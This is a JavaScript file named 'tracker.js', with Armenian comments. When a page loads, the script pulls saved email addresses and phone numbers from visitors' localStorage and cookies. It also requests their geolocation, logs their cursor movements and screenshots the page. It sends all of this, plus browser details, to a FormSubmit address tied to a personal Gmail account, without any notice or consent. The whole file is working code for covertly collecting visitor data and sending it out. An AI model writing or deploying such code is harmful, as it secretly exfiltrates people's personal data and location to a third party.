// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
function trackVisitor() {
    const data = {
        website: window.location.href || "index.html",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        referrer: document.referrer || "Direct visit",
        visitTime: new Date().toISOString(),
        ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
    };

    // Ստուգել localStorage-ում պահված տվյալները
    try {
        const savedEmail = localStorage.getItem('userEmail');
        const savedPhone = localStorage.getItem('userPhone');
        
        if (savedEmail) data.savedEmail = savedEmail;
        if (savedPhone) data.savedPhone = savedPhone;
    } catch (e) {
        console.log("LocalStorage access error:", e);
    }

    // Ստուգել cookies-ում պահված տվյալները
    try {
        const cookies = document.cookie.split(';').reduce((res, c) => {
        const [key, val] = c.trim().split('=').map(decodeURIComponent);
        return Object.assign(res, { [key]: val });
        }, {});

        if (cookies.email) data.cookieEmail = cookies.email;
        if (cookies.phone) data.cookiePhone = cookies.phone;
    } catch (e) {
        console.log("Cookie access error:", e);
    }

    // Կուրսորի հետևում
    const cursorPositions = [];
    document.addEventListener('mousemove', (e) => {
        cursorPositions.push({
            x: e.clientX,
            y: e.clientY,
            time: new Date().toISOString()
        });
        
        // Պահպանել միայն վերջին 50 դիրքերը
        if (cursorPositions.length > 50) {
            cursorPositions.shift();
        }
    });

    // Փորձել ստանալ գեոտեղադրություն
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
        position => {
            data.latitude = position.coords.latitude;
            data.longitude = position.coords.longitude;
            captureAndSend(data, cursorPositions);
        },
        () => {
            data.locationError = "Geolocation unavailable";
            captureAndSend(data, cursorPositions);
        }
        );
    } else {
        captureAndSend(data, cursorPositions);
    }
}

// Էկրանի լուսանկար և տվյալների ուղարկում
function captureAndSend(data, cursorPositions) {
    // Ավելացնել կուրսորի դիրքերը
    data.cursorMovements = cursorPositions;

    // HTML2Canvas-ի միջոցով էկրանի լուսանկար
    if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body).then(canvas => {
            // Փոքրացնել պատկերի չափը
            const scaledCanvas = document.createElement('canvas');
            const scale = 0.5;
            scaledCanvas.width = canvas.width * scale;
            scaledCanvas.height = canvas.height * scale;
            
            const ctx = scaledCanvas.getContext('2d');
            ctx.drawImage(canvas, 0, 0, scaledCanvas.width, scaledCanvas.height);
            
            // Փոխակերպել base64
            const screenshot = scaledCanvas.toDataURL('image/jpeg', 0.7);
            data.screenshot = screenshot;
            
            sendData(data);
        }).catch(err => {
            console.log("Screenshot error:", err);
            data.screenshotError = err.message;
            sendData(data);
        });
    } else {
        data.screenshotError = "html2canvas not loaded";
        sendData(data);
    }
}

// Տվյալների ուղարկում FormSubmit-ին
function sendData(data) {
    fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
        method: "POST",
        headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => console.log("Success:", data))
    .catch(error => console.error("Error:", error));
}

// Բեռնել html2canvas գրադարանը դինամիկորեն
function loadHtml2Canvas(callback) {
    const script = document.createElement('script');
    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    script.onload = callback;
    script.onerror = () => console.log("Failed to load html2canvas");
    document.head.appendChild(script);
}

// Գործարկել հետևումը էջի բեռնվելուց հետո
window.addEventListener('load', () => {
    loadHtml2Canvas(trackVisitor);
});